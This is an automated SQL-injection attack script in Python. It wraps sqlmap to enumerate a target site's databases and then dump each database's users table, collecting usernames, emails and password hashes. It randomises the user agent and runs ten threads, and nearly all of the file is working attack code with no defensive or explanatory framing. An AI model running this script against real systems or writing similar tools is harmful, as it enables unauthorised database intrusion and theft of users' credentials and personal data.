import asyncio
import re
import logging

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

TABLE_NAME = "users"
COLUMNS = ["uname", "email", "cart"]  # cart = password hash


async def run_sqlmap_databases(target_url: str):
    logger.info("Step 1: Enumerating databases...")
    cmd = [
        "sqlmap", "-u", target_url,
        "--batch", "--random-agent",
        "--dbs"
    ]

    process = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    stdout, stderr = await process.communicate()

    if stderr:
        err_msg = stderr.decode().strip()
        if err_msg:
            logger.error(f"Error from SQLMap during DB enumeration:\n{err_msg}")

    output = stdout.decode()
    dbs = parse_databases(output)
    logger.info(f"Step 2: Found databases: {', '.join(dbs) if dbs else 'None'}")
    return dbs


def parse_databases(output: str):
    databases = []
    capture = False

    for line in output.splitlines():
        if line.strip().lower().startswith("available databases"):
            capture = True
            continue

        if capture:
            line = line.strip()
            if not line or set(line) <= {"-", "+", "|", " "}:
                continue

            dbname = re.sub(r"^\[\*\]\s*", "", line)
            if "fetched data logged" in dbname.lower() or "ending @" in dbname.lower():
                break
            if " " in dbname:
                break
            if dbname:
                databases.append(dbname)
    return databases


async def run_sqlmap_dump(target_url: str, db_name: str):
    logger.info(f"Step 3: Dumping data from database '{db_name}'...")
    cmd = [
        "sqlmap", "-u", target_url,
        "--batch", "--random-agent",
        "-D", db_name,
        "-T", TABLE_NAME,
        "-C", ",".join(COLUMNS),
        "--dump",
        "--threads", "10"
    ]

    process = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    stdout, stderr = await process.communicate()

    if stderr:
        err_msg = stderr.decode().strip()
        if err_msg:
            logger.error(f"Error from SQLMap during data dump:\n{err_msg}")
            return db_name, []

    output = stdout.decode()
    records = await parse_output(output)
    return db_name, records


async def parse_output(output: str):
    seen_header = False
    records = []

    for line in output.splitlines():
        if re.match(r"^\| .* \|$", line):
            parts = [p.strip() for p in line.strip("|").split("|")]

            if not seen_header:
                seen_header = True
                continue

            if len(parts) == len(COLUMNS):
                record = dict(zip(COLUMNS, parts))
                records.append(record)

    return records


async def sql_exploits(target_url: str):
    databases = await run_sqlmap_databases(target_url)
    if not databases:
        logger.error("No databases found. Exiting.")
        return []

    all_records = []

    for db in databases:
        db_name, records = await run_sqlmap_dump(target_url, db)
        for rec in records:
            all_records.append({
                "Database_name": db_name,
                "Uname": rec.get("uname", ""),
                "Email": rec.get("email", ""),
                "Password Hash": rec.get("cart", ""),
            })

    return all_records